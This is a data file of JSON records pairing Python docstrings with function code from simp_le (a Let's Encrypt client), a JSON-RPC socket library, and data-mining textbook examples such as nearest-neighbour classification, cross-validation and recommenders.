{"docstring": "\"\"\"Compute webroots.\n\nArgs:\n  vhosts: collection of `Vhost` objects.\n  default_root: Default webroot path.\n\nReturns:\n  Dictionary mapping vhost name to its webroot path. Vhosts without\n  a root will be pre-populated with the `default_root`.\n\"\"\"\n", "func_signal": "def compute_roots(vhosts, default_root):\n", "code": "roots = {}\nfor vhost in vhosts:\n    if vhost.root is not None:\n        root = vhost.root\n    else:\n        root = default_root\n    roots[vhost.name] = root\n\nempty_roots = dict((name, root)\n                   for name, root in six.iteritems(roots) if root is None)\nif empty_roots:\n    raise Error('Root for the following host(s) were not specified: %s. '\n                'Try --default_root or use -d example.com:/var/www/html '\n                'syntax' % ', '.join(empty_roots))\nreturn roots", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Run integration tests (--integration-test).\"\"\"\n", "func_signal": "def integration_test(args):\n", "code": "return test_suite(\n    args, unittest.defaultTestLoader.loadTestsFromTestCase(\n        IntegrationTests))", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Assert raises context manager.\"\"\"\n", "func_signal": "def assert_raises(self, exc):\n", "code": "context = self.AssertRaisesContext()\ntry:\n    yield context\nexcept exc as error:\n    context.error = error\nelse:\n    self.fail('Expected exception (%s) not raised' % exc)", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Check or generate account key.\"\"\"\n", "func_signal": "def check_or_generate_account_key(args, existing):\n", "code": "if existing is None:\n    logger.info('Generating new account key')\n    return jose.JWKRSA(key=rsa.generate_private_key(\n        public_exponent=args.account_key_public_exponent,\n        key_size=args.account_key_size,\n        backend=default_backend(),\n    ))\nreturn existing", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"Find supported challenge body.\n\nThis plugin supports only `http-01`, so CA must offer it as a\nsingle-element combo. If this is not the case this function returns\n`None`.\n\nReturns:\n  `acme.messages.ChallengeBody` with `http-01` challenge or `None`.\n\"\"\"\n", "func_signal": "def supported_challb(authorization):\n", "code": "for combo in authorization.body.combinations:\n    first_challb = authorization.body.challenges[combo[0]]\n    if len(combo) == 1 and isinstance(\n            first_challb.chall, challenges.HTTP01):\n        return first_challb\nreturn None", "path": "simp_le.py", "repo_name": "kuba/simp_le", "stars": 890, "license": "gpl-3.0", "language": "python", "size": 361}
{"docstring": "\"\"\"\n:Parameters:\n    - addr: socket-address\n    - timeout: timeout in seconds\n    - logfunc: function for logging, logfunc(message)\n:Raises: socket.timeout after timeout\n\"\"\"\n", "func_signal": "def __init__( self, addr, limit=4096, sock_type=socket.AF_INET, sock_prot=socket.SOCK_STREAM, timeout=5.0, logfunc=log_dummy ):\n", "code": "self.limit  = limit\nself.addr   = addr\nself.s_type = sock_type\nself.s_prot = sock_prot\nself.s      = None\nself.timeout = timeout\nself.log    = logfunc", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"send data + receive data + close\"\"\"\n", "func_signal": "def sendrecv( self, string ):\n", "code": "try:\n    self.send( string )\n    return self.recv()\nfinally:\n    self.close()", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"Convert all keys of the dict 'd' to (ascii-)strings.\n\n:Raises: UnicodeEncodeError\n\"\"\"\n", "func_signal": "def dictkeyclean(d):\n", "code": "new_d = {}\nfor (k, v) in d.iteritems():\n    new_d[str(k)] = v\nreturn new_d", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize a JSON-RPC-Notification\n\n:Parameters: see dumps_request\n:Returns:   | {\"method\": \"...\", \"params\": ..., \"id\": null}\n            | \"method\", \"params\" and \"id\" are always in this order.\n:Raises:    see dumps_request\n\"\"\"\n", "func_signal": "def dumps_notification( self, method, params=() ):\n", "code": "if not isinstance(method, (str, unicode)):\n    raise TypeError('\"method\" must be a string (or unicode string).')\nif not isinstance(params, (tuple, list)):\n    raise TypeError(\"params must be a tuple/list.\")\n\nreturn '{\"method\": %s, \"params\": %s, \"id\": null}' % \\\n        (self.dumps(method), self.dumps(params))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"return a logfunc which logs to a file (in utf-8)\"\"\"\n", "func_signal": "def log_file( filename ):\n", "code": "def logfile( message ):\n    f = codecs.open( filename, 'a', encoding='utf-8' )\n    f.write( message+\"\\n\" )\n    f.close()\nreturn logfile", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize JSON-RPC-Request\n\n:Parameters:\n    - method: the method-name (str/unicode)\n    - params: the parameters (list/tuple/dict)\n    - id:     the id (should not be None)\n:Returns:   | {\"jsonrpc\": \"2.0\", \"method\": \"...\", \"params\": ..., \"id\": ...}\n            | \"jsonrpc\", \"method\", \"params\" and \"id\" are always in this order.\n            | \"params\" is omitted if empty\n:Raises:    TypeError if method/params is of wrong type or \n            not JSON-serializable\n\"\"\"\n", "func_signal": "def dumps_request( self, method, params=(), id=0 ):\n", "code": "if not isinstance(method, (str, unicode)):\n    raise TypeError('\"method\" must be a string (or unicode string).')\nif not isinstance(params, (tuple, list, dict)):\n    raise TypeError(\"params must be a tuple/list/dict or None.\")\n\nif params:\n    return '{\"jsonrpc\": \"2.0\", \"method\": %s, \"params\": %s, \"id\": %s}' % \\\n            (self.dumps(method), self.dumps(params), self.dumps(id))\nelse:\n    return '{\"jsonrpc\": \"2.0\", \"method\": %s, \"id\": %s}' % \\\n            (self.dumps(method), self.dumps(id))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize JSON-RPC-Request\n\n:Parameters:\n    - method: the method-name (str/unicode)\n    - params: the parameters (list/tuple)\n    - id:     if id=None, this results in a Notification\n:Returns:   | {\"method\": \"...\", \"params\": ..., \"id\": ...}\n            | \"method\", \"params\" and \"id\" are always in this order.\n:Raises:    TypeError if method/params is of wrong type or \n            not JSON-serializable\n\"\"\"\n", "func_signal": "def dumps_request( self, method, params=(), id=0 ):\n", "code": "if not isinstance(method, (str, unicode)):\n    raise TypeError('\"method\" must be a string (or unicode string).')\nif not isinstance(params, (tuple, list)):\n    raise TypeError(\"params must be a tuple/list.\")\n\nreturn '{\"method\": %s, \"params\": %s, \"id\": %s}' % \\\n        (self.dumps(method), self.dumps(params), self.dumps(id))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serve (forever or for n communicaions).\n\n- receive data\n- call result = handler(data)\n- send back result if not None\n\nThe serving can be stopped by SIGINT.\n\n:TODO:\n    - how to stop?\n      maybe use a .run-file, and stop server if file removed?\n    - maybe make n_current accessible? (e.g. for logging)\n\"\"\"\n", "func_signal": "def serve( self, handler, n=None ):\n", "code": "n_current = 0\nwhile 1:\n    if n is not None  and  n_current >= n:\n        break\n    data = self.recv()\n    result = handler(data)\n    if result is not None:\n        self.send( result )\n    n_current += 1", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize a JSON-RPC-Response (without error)\n\n:Returns:   | {\"jsonrpc\": \"2.0\", \"result\": ..., \"id\": ...}\n            | \"jsonrpc\", \"result\", and \"id\" are always in this order.\n:Raises:    TypeError if not JSON-serializable\n\"\"\"\n", "func_signal": "def dumps_response( self, result, id=None ):\n", "code": "return '{\"jsonrpc\": \"2.0\", \"result\": %s, \"id\": %s}' % \\\n        (self.dumps(result), self.dumps(id))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize a JSON-RPC-Notification\n\n:Parameters: see dumps_request\n:Returns:   | {\"jsonrpc\": \"2.0\", \"method\": \"...\", \"params\": ...}\n            | \"jsonrpc\", \"method\" and \"params\" are always in this order.\n:Raises:    see dumps_request\n\"\"\"\n", "func_signal": "def dumps_notification( self, method, params=() ):\n", "code": "if not isinstance(method, (str, unicode)):\n    raise TypeError('\"method\" must be a string (or unicode string).')\nif not isinstance(params, (tuple, list, dict)):\n    raise TypeError(\"params must be a tuple/list/dict or None.\")\n\nif params:\n    return '{\"jsonrpc\": \"2.0\", \"method\": %s, \"params\": %s}' % \\\n            (self.dumps(method), self.dumps(params))\nelse:\n    return '{\"jsonrpc\": \"2.0\", \"method\": %s}' % \\\n            (self.dumps(method))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"return a logfunc which logs date+message to a file (in utf-8)\"\"\"\n", "func_signal": "def log_filedate( filename ):\n", "code": "def logfile( message ):\n    f = codecs.open( filename, 'a', encoding='utf-8' )\n    f.write( time.strftime(\"%Y-%m-%d %H:%M:%S \")+message+\"\\n\" )\n    f.close()\nreturn logfile", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"init: set serializer to use\n\n:Parameters:\n    - dumps: json-encoder-function\n    - loads: json-decoder-function\n:Note: The dumps_* functions of this class already directly create\n       the invariant parts of the resulting json-object themselves,\n       without using the given json-encoder-function.\n\"\"\"\n", "func_signal": "def __init__(self, dumps=json.dumps, loads=json.loads):\n", "code": "self.dumps = dumps\nself.loads = loads", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"write a message to the logfile (in utf-8)\"\"\"\n", "func_signal": "def log(self, message):\n", "code": "if self.logfile is not None:\n    f = codecs.open( self.logfile, 'a', encoding='utf-8' )\n    f.write( time.strftime(\"%Y-%m-%d %H:%M:%S \")+message+\"\\n\" )\n    f.close()", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize a JSON-RPC-Response-error\n      \n:Parameters:\n    - error: a RPCFault instance\n:Returns:   | {\"jsonrpc\": \"2.0\", \"error\": {\"code\": error_code, \"message\": error_message, \"data\": error_data}, \"id\": ...}\n            | \"jsonrpc\", \"result\", \"error\" and \"id\" are always in this order, data is omitted if None.\n:Raises:    ValueError if error is not a RPCFault instance,\n            TypeError if not JSON-serializable\n\"\"\"\n", "func_signal": "def dumps_error( self, error, id=None ):\n", "code": "if not isinstance(error, RPCFault):\n    raise ValueError(\"\"\"error must be a RPCFault-instance.\"\"\")\nif error.error_data is None:\n    return '{\"jsonrpc\": \"2.0\", \"error\": {\"code\":%s, \"message\": %s}, \"id\": %s}' % \\\n            (self.dumps(error.error_code), self.dumps(error.error_message), self.dumps(id))\nelse:\n    return '{\"jsonrpc\": \"2.0\", \"error\": {\"code\":%s, \"message\": %s, \"data\": %s}, \"id\": %s}' % \\\n            (self.dumps(error.error_code), self.dumps(error.error_message), self.dumps(error.error_data), self.dumps(id))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"Add all functions of a class-instance to the RPC-services.\n\nAll entries of the instance which do not begin with '_' are added.\n\n:Parameters:\n    - myinst: class-instance containing the functions\n    - name:   | hierarchical prefix.\n              | If omitted, the functions are added directly.\n              | If given, the functions are added as \"name.function\".\n:TODO:\n    - only add functions and omit attributes?\n    - improve hierarchy?\n\"\"\"\n", "func_signal": "def register_instance(self, myinst, name=None):\n", "code": "for e in dir(myinst):\n    if e[0][0] != \"_\":\n        if name is None:\n            self.register_function( getattr(myinst, e) )\n        else:\n            self.register_function( getattr(myinst, e), name=\"%s.%s\" % (name, e) )", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"\n:Parameters:\n    - data_serializer: a data_structure+serializer-instance\n    - transport: a Transport instance\n    - logfile: file to log (\"unexpected\") errors to\n\"\"\"\n#TODO: check parameters\n", "func_signal": "def __init__( self, data_serializer, transport, logfile=None ):\n", "code": "self.__data_serializer = data_serializer\nif not isinstance(transport, Transport):\n    raise ValueError('invalid \"transport\" (must be a Transport-instance)\"')\nself.__transport = transport\nself.logfile = logfile\nif self.logfile is not None:    #create logfile (or raise exception)\n    f = codecs.open( self.logfile, 'a', encoding='utf-8' )\n    f.close()\n\nself.funcs = {}", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"open socket, wait for incoming connections and handle them.\n\n:Parameters:\n    - n: serve n requests, None=forever\n\"\"\"\n", "func_signal": "def serve(self, handler, n=None):\n", "code": "self.close()\nself.s = socket.socket( self.s_type, self.s_prot )\ntry:\n    self.log( \"listen %s\" % repr(self.addr) )\n    self.s.bind( self.addr )\n    self.s.listen(1)\n    n_current = 0\n    while 1:\n        if n is not None  and  n_current >= n:\n            break\n        conn, addr = self.s.accept()\n        self.log( \"%s connected\" % repr(addr) )\n        data = conn.recv(self.limit)\n        self.log( \"%s --> %s\" % (repr(addr), repr(data)) )\n        result = handler(data)\n        if data is not None:\n            self.log( \"%s <-- %s\" % (repr(addr), repr(result)) )\n            conn.send( result )\n        self.log( \"%s close\" % repr(addr) )\n        conn.close()\n        n_current += 1\nfinally:\n    self.close()", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"serialize a JSON-RPC-Response-error\n\nSince JSON-RPC 1.0 does not define an error-object, this uses the\nJSON-RPC 2.0 error-object.\n      \n:Parameters:\n    - error: a RPCFault instance\n:Returns:   | {\"result\": null, \"error\": {\"code\": error_code, \"message\": error_message, \"data\": error_data}, \"id\": ...}\n            | \"result\", \"error\" and \"id\" are always in this order, data is omitted if None.\n:Raises:    ValueError if error is not a RPCFault instance,\n            TypeError if not JSON-serializable\n\"\"\"\n", "func_signal": "def dumps_error( self, error, id=None ):\n", "code": "if not isinstance(error, RPCFault):\n    raise ValueError(\"\"\"error must be a RPCFault-instance.\"\"\")\nif error.error_data is None:\n    return '{\"result\": null, \"error\": {\"code\":%s, \"message\": %s}, \"id\": %s}' % \\\n            (self.dumps(error.error_code), self.dumps(error.error_message), self.dumps(id))\nelse:\n    return '{\"result\": null, \"error\": {\"code\":%s, \"message\": %s, \"data\": %s}, \"id\": %s}' % \\\n            (self.dumps(error.error_code), self.dumps(error.error_message), self.dumps(error.error_data), self.dumps(id))", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"\n:Parameters:\n    - data_serializer: a data_structure+serializer-instance\n    - transport: a Transport instance\n\"\"\"\n#TODO: check parameters\n", "func_signal": "def __init__( self, data_serializer, transport ):\n", "code": "self.__data_serializer = data_serializer\nif not isinstance(transport, Transport):\n    raise ValueError('invalid \"transport\" (must be a Transport-instance)\"')\nself.__transport = transport", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"init: set serializer to use\n\n:Parameters:\n    - dumps: json-encoder-function\n    - loads: json-decoder-function\n:Note: The dumps_* functions of this class already directly create\n       the invariant parts of the resulting json-object themselves,\n       without using the given json-encoder-function.\n\"\"\"\n", "func_signal": "def __init__(self, dumps=json.dumps, loads=json.loads):\n", "code": "self.dumps = dumps\nself.loads = loads", "path": "jsonrpc.py", "repo_name": "dasmith/stanford-corenlp-python", "stars": 610, "license": "gpl-2.0", "language": "python", "size": 193295}
{"docstring": "\"\"\"return nearest neighbor to itemVector\"\"\"\n", "func_signal": "def nearestNeighbor(self, itemVector):\n", "code": "return min([ (self.manhattan(itemVector, item[1]), item)\n             for item in self.data])", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Test the classifier on a test set of data\"\"\"\n", "func_signal": "def test(training_filename, test_filename):\n", "code": "classifier = Classifier(training_filename)\nf = open(test_filename)\nlines = f.readlines()\nf.close()\nnumCorrect = 0.0\nfor line in lines:\n    data = line.strip().split('\\t')\n    vector = []\n    classInColumn = -1\n    for i in range(len(classifier.format)):\n          if classifier.format[i] == 'num':\n              vector.append(float(data[i]))\n          elif classifier.format[i] == 'class':\n              classInColumn = i\n    theClass= classifier.classify(vector)\n    prefix = '-'\n    if theClass == data[classInColumn]:\n        # it is correct\n        numCorrect += 1\n        prefix = '+'\n    print(\"%s  %12s  %s\" % (prefix, theClass, line))\nprint(\"%4.2f%% correct\" % (numCorrect * 100/ len(lines)))", "path": "ch5\\nearestNeighborClassifier.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\" initialize recommender\ncurrently, if data is dictionary the recommender is initialized\nto it.\nFor all other data types of data, no initialization occurs\nk is the k value for k nearest neighbor\nmetric is which distance formula to use\nn is the maximum number of recommendations to make\"\"\"\n", "func_signal": "def __init__(self, data, k=1, metric='pearson', n=5):\n", "code": "self.k = k\nself.n = n\nself.username2id = {}\nself.userid2name = {}\nself.productid2name = {}\n# for some reason I want to save the name of the metric\nself.metric = metric\nif self.metric == 'pearson':\n    self.fn = self.pearson\n#\n# if data is dictionary set recommender data to it\n#\nif type(data).__name__ == 'dict':\n    self.data = data", "path": "ch2\\recommender.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Given product id number return product name\"\"\"\n", "func_signal": "def convertProductID2name(self, id):\n", "code": "if id in self.productid2name:\n    return self.productid2name[id]\nelse:\n    return id", "path": "ch2\\recommender.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Print dendrogram of a binary tree.  Each tree node is represented by a length-2 tuple.\nprintDendrogram is written and provided by David Eppstein 2002. Accessed on 14 April 2014:\nhttp://code.activestate.com/recipes/139422-dendrogram-drawing/ \"\"\"\n\t\n", "func_signal": "def printDendrogram(T, sep=3):\n", "code": "def isPair(T):\n    return type(T) == tuple and len(T) == 2\n\ndef maxHeight(T):\n    if isPair(T):\n        h = max(maxHeight(T[0]), maxHeight(T[1]))\n    else:\n        h = len(str(T))\n    return h + sep\n    \nactiveLevels = {}\n\ndef traverse(T, h, isFirst):\n    if isPair(T):\n        traverse(T[0], h-sep, 1)\n        s = [' ']*(h-sep)\n        s.append('|')\n    else:\n        s = list(str(T))\n        s.append(' ')\n\n    while len(s) < h:\n        s.append('-')\n    \n    if (isFirst >= 0):\n        s.append('+')\n        if isFirst:\n            activeLevels[h] = 1\n        else:\n            del activeLevels[h]\n    \n    A = list(activeLevels)\n    A.sort()\n    for L in A:\n        if len(s) < L:\n            while len(s) < L:\n                s.append(' ')\n            s.append('|')\n\n    print (''.join(s))    \n    \n    if isPair(T):\n        traverse(T[1], h-sep, 0)\n\ntraverse(T, maxHeight(T), -1)", "path": "ch8\\hierarchicalClustererTemplate.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"given a column number, normalize that column in self.data\"\"\"\n# first extract values to list\n", "func_signal": "def normalizeColumn(self, columnNumber):\n", "code": "col = [v[1][columnNumber] for v in self.data]\nmedian = self.getMedian(col)\nasd = self.getAbsoluteStandardDeviation(col, median)\n#print(\"Median: %f   ASD = %f\" % (median, asd))\nself.medianAndDeviation.append((median, asd))\nfor v in self.data:\n    v[1][columnNumber] = (v[1][columnNumber] - median) / asd", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"return median of alist\"\"\"\n", "func_signal": "def getMedian(self, alist):\n", "code": "if alist == []:\n    return []\nblist = sorted(alist)\nlength = len(alist)\nif length % 2 == 1:\n    # length of list is odd so return middle element\n    return blist[int(((length + 1) / 2) -  1)]\nelse:\n    # length of list is even so compute midpoint\n    v1 = blist[int(length / 2)]\n    v2 =blist[(int(length / 2) - 1)]\n    return (v1 + v2) / 2.0", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"given a column number, normalize that column in self.data\"\"\"\n# first extract values to list\n", "func_signal": "def normalizeColumn(self, columnNumber):\n", "code": "col = [v[1][columnNumber] for v in self.data]\nmedian = self.getMedian(col)\nasd = self.getAbsoluteStandardDeviation(col, median)\n#print(\"Median: %f   ASD = %f\" % (median, asd))\nself.medianAndDeviation.append((median, asd))\nfor v in self.data:\n    v[1][columnNumber] = (v[1][columnNumber] - median) / asd", "path": "ch5\\nearestNeighborClassifier.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"return median of alist\"\"\"\n", "func_signal": "def getMedian(self, alist):\n", "code": "if alist == []:\n    return []\nblist = sorted(alist)\nlength = len(alist)\nif length % 2 == 1:\n    # length of list is odd so return middle element\n    return blist[int(((length + 1) / 2) -  1)]\nelse:\n    # length of list is even so compute midpoint\n    v1 = blist[int(length / 2)]\n    v2 =blist[(int(length / 2) - 1)]\n    return (v1 + v2) / 2.0", "path": "ch5\\nearestNeighborClassifier.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"get median value of list alist\"\"\"\n", "func_signal": "def getMedian(alist):\n", "code": "tmp = list(alist)\ntmp.sort()\nalen = len(tmp)\nif (alen % 2) == 1:\n    return tmp[alen // 2]\nelse:\n    return (tmp[alen // 2] + tmp[(alen // 2) - 1]) / 2", "path": "ch8\\hierarchicalClustererTemplate.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"We have stored the median and asd for each column.\nWe now use them to normalize vector v\"\"\"\n", "func_signal": "def normalizeVector(self, v):\n", "code": "vector = list(v)\nfor i in range(len(vector)):\n    (median, asd) = self.medianAndDeviation[i]\n    vector[i] = (vector[i] - median) / asd\nreturn vector", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Normalize column using Modified Standard Score\"\"\"\n", "func_signal": "def normalizeColumn(column):\n", "code": "median = getMedian(column)\nasd = sum([abs(x - median) for x in column]) / len(column)\nresult = [(x - median) / asd for x in column]\nreturn result", "path": "ch8\\hierarchicalClusterer.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Evaluate the classifier with data from the file\nbucketPrefix-bucketNumber\"\"\"\n\n", "func_signal": "def testBucket(self, bucketPrefix, bucketNumber):\n", "code": "filename = \"%s-%02i\" % (bucketPrefix, bucketNumber)\nf = open(filename)\nlines = f.readlines()\ntotals = {}\nf.close()\nfor line in lines:\n    data = line.strip().split('\\t')\n    vector = []\n    classInColumn = -1\n    for i in range(len(self.format)):\n          if self.format[i] == 'num':\n              vector.append(float(data[i]))\n          elif self.format[i] == 'class':\n              classInColumn = i\n    theRealClass = data[classInColumn]\n    classifiedAs = self.classify(vector)\n    totals.setdefault(theRealClass, {})\n    totals[theRealClass].setdefault(classifiedAs, 0)\n    totals[theRealClass][classifiedAs] += 1\nreturn totals", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Normalize column using Modified Standard Score\"\"\"\n", "func_signal": "def normalizeColumn(column):\n", "code": "median = getMedian(column)\nasd = sum([abs(x - median) for x in column]) / len(column)\nresult = [(x - median) / asd for x in column]\nreturn result", "path": "ch8\\hierarchicalClustererTemplate.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Return n top ratings for user with id\"\"\"\n", "func_signal": "def userRatings(self, id, n):\n", "code": "print (\"Ratings for \" + self.userid2name[id])\nratings = self.data[id]\nprint(len(ratings))\nratings = list(ratings.items())\nratings = [(self.convertProductID2name(k), v)\n           for (k, v) in ratings]\n# finally sort and return\nratings.sort(key=lambda artistTuple: artistTuple[1],\n             reverse = True)\nratings = ratings[:n]\nfor rating in ratings:\n    print(\"%s\\t%i\" % (rating[0], rating[1]))", "path": "ch2\\recommender.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"loads the BX book dataset. Path is where the BX files are\nlocated\"\"\"\n", "func_signal": "def loadBookDB(self, path=''):\n", "code": "self.data = {}\ni = 0\n#\n# First load book ratings into self.data\n#\nf = codecs.open(path + \"BX-Book-Ratings.csv\", 'r', 'utf8')\nfor line in f:\n    i += 1\n    #separate line into fields\n    fields = line.split(';')\n    user = fields[0].strip('\"')\n    book = fields[1].strip('\"')\n    rating = int(fields[2].strip().strip('\"'))\n    if user in self.data:\n        currentRatings = self.data[user]\n    else:\n        currentRatings = {}\n    currentRatings[book] = rating\n    self.data[user] = currentRatings\nf.close()\n#\n# Now load books into self.productid2name\n# Books contains isbn, title, and author among other fields\n#\nf = codecs.open(path + \"BX-Books.csv\", 'r', 'utf8')\nfor line in f:\n    i += 1\n    #separate line into fields\n    fields = line.split(';')\n    isbn = fields[0].strip('\"')\n    title = fields[1].strip('\"')\n    author = fields[2].strip().strip('\"')\n    title = title + ' by ' + author\n    self.productid2name[isbn] = title\nf.close()\n#\n#  Now load user info into both self.userid2name and\n#  self.username2id\n#\nf = codecs.open(path + \"BX-Users.csv\", 'r', 'utf8')\nfor line in f:\n    i += 1\n    #print(line)\n    #separate line into fields\n    fields = line.split(';')\n    userid = fields[0].strip('\"')\n    location = fields[1].strip('\"')\n    if len(fields) > 3:\n        age = fields[2].strip().strip('\"')\n    else:\n        age = 'NULL'\n    if age != 'NULL':\n        value = location + '  (age: ' + age + ')'\n    else:\n        value = location\n    self.userid2name[userid] = value\n    self.username2id[location] = userid\nf.close()\nprint(i)", "path": "ch2\\recommender.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"given alist and median return absolute standard deviation\"\"\"\n", "func_signal": "def getAbsoluteStandardDeviation(self, alist, median):\n", "code": "sum = 0\nfor item in alist:\n    sum += abs(item - median)\nreturn sum / len(alist)", "path": "ch5\\nearestNeighborClassifier.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"return nearest neighbor to itemVector\"\"\"\n", "func_signal": "def nearestNeighbor(self, itemVector):\n", "code": "return min([ (self.manhattan(itemVector, item[1]), item)\n             for item in self.data])", "path": "ch5\\nearestNeighborClassifier.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"given alist and median return absolute standard deviation\"\"\"\n", "func_signal": "def getAbsoluteStandardDeviation(self, alist, median):\n", "code": "sum = 0\nfor item in alist:\n    sum += abs(item - median)\nreturn sum / len(alist)", "path": "ch5\\crossValidation.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
{"docstring": "\"\"\"Give list of recommendations\"\"\"\n", "func_signal": "def recommend(self, user):\n", "code": "recommendations = {}\n# first get list of users  ordered by nearness\nnearest = self.computeNearestNeighbor(user)\n#\n# now get the ratings for the user\n#\nuserRatings = self.data[user]\n#\n# determine the total distance\ntotalDistance = 0.0\nfor i in range(self.k):\n   totalDistance += nearest[i][1]\n# now iterate through the k nearest neighbors\n# accumulating their ratings\nfor i in range(self.k):\n   # compute slice of pie \n   weight = nearest[i][1] / totalDistance\n   # get the name of the person\n   name = nearest[i][0]\n   # get the ratings for this person\n   neighborRatings = self.data[name]\n   # get the name of the person\n   # now find bands neighbor rated that user didn't\n   for artist in neighborRatings:\n      if not artist in userRatings:\n         if artist not in recommendations:\n            recommendations[artist] = (neighborRatings[artist]\n                                       * weight)\n         else:\n            recommendations[artist] = (recommendations[artist]\n                                       + neighborRatings[artist]\n                                       * weight)\n# now make list from dictionary\nrecommendations = list(recommendations.items())\nrecommendations = [(self.convertProductID2name(k), v)\n                   for (k, v) in recommendations]\n# finally sort and return\nrecommendations.sort(key=lambda artistTuple: artistTuple[1],\n                     reverse = True)\n# Return the first n items\nreturn recommendations[:self.n]", "path": "ch2\\recommender.py", "repo_name": "zacharski/pg2dm-python", "stars": 867, "license": "None", "language": "python", "size": 3764}
